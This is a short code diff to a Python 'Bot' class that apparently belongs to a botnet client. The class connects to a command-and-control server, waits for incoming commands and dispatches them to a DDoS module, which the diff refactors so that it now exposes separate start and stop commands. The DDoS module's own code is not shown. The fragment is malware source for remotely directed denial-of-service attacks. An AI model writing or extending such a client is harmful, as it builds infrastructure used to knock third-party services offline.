@@ -23,15 +23,17 @@ class Bot(object):
     __modules = None
 
     def __init__(self, client):
-        """ Initializes with a client object and add feature modules
-            objects to the modules dictionary"""
+        """ Initializes with a client object and add feature module
+            objects to the modules dictionary."""
         self.__client = client
-        self.__modules = {1:DDoSModule()}
+        ddos = DDoSModule()
+        self.__modules = {1:ddos.start,
+                          2:ddos.stop}        
         
     def runCommand(self, cmd):
         """ Calls the module's start method with the right code.
             Passes it's arguments if there are any."""
-        self.__modules[int(cmd[0])].start(cmd[1:])
+        self.__modules[int(cmd[0])](cmd[1:])
     
     def activate(self):
         """ Connects to the C&C an infinitely waits for incoming commands.
